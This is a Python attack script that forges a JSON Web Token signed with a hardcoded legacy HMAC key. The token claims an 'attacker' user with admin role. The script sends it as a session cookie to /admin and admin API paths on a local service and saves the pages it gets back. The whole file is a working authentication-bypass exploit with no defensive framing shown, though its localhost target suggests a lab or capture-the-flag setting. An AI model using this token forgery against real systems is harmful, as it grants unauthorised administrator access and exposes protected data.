import base64, hmac, hashlib, json, time, urllib.request

key = 'axiom-auth-hs256-legacy-2019'
now = int(time.time())
header = {'alg': 'HS256', 'typ': 'JWT'}
payload = {
    'sub': 'attacker',
    'name': 'Attacker Admin',
    'role': 'admin',
    'org': 'org_admin',
    'iss': 'axiom-auth',
    'iat': now,
    'exp': now + 3600
}

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

msg = b64url(json.dumps(header, separators=(',', ':')).encode()) + '.' + b64url(json.dumps(payload, separators=(',', ':')).encode())
sig = b64url(hmac.new(key.encode(), msg.encode(), hashlib.sha256).digest())
token = msg + '.' + sig

for path in ['/admin', '/admin/content', '/api/admin/content']:
    req = urllib.request.Request(f'http://127.0.0.1:8973{path}', headers={'Cookie': f'axm_session={token}'})
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        data = resp.read().decode()
        open(path.replace('/','_') + '.html', 'w', encoding='utf-8').write(data)
        print(path, resp.status, len(data))
    except urllib.error.HTTPError as e:
        open(path.replace('/','_') + '.html', 'w', encoding='utf-8').write(e.read().decode())
        print(path, 'ERR', e.code, len(open(path.replace('/','_') + '.html').read()))
    except Exception as e:
        print(path, 'EXC', e)
